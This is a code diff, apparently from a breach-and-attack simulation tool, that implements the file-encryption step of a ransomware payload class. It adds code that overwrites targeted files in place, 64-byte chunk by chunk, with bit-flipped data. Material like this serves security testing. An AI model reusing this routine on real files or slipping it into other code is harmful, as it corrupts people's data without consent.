@@ -2,6 +2,7 @@ import logging
 from pathlib import Path
 
 from infection_monkey.ransomware.valid_file_extensions import VALID_FILE_EXTENSIONS_FOR_ENCRYPTION
+from infection_monkey.utils import bit_manipulators
 from infection_monkey.utils.dir_utils import (
     file_extension_filter,
     filter_files,
@@ -12,6 +13,8 @@ from infection_monkey.utils.dir_utils import (
 from infection_monkey.utils.environment import is_windows_os
 
 LOG = logging.getLogger(__name__)
+
+CHUNK_SIZE = 64
 
 
 class RansomewarePayload:
@@ -36,8 +39,18 @@ class RansomewarePayload:
         return filter_files(all_files, file_filters)
 
     def _encrypt_files(self, file_list):
-        for file in file_list:
-            self._encrypt_file(file)
+        for filepath in file_list:
+            self._encrypt_file(filepath)
 
-    def _encrypt_file(self, file):
-        pass
+    def _encrypt_file(self, filepath):
+        with open(filepath, "rb+") as f:
+            data = f.read(CHUNK_SIZE)
+            while data:
+                num_bytes_read = len(data)
+
+                encrypted_data = bit_manipulators.flip_bits(data)
+
+                f.seek(-num_bytes_read, 1)
+                f.write(encrypted_data)
+
+                data = f.read(CHUNK_SIZE)
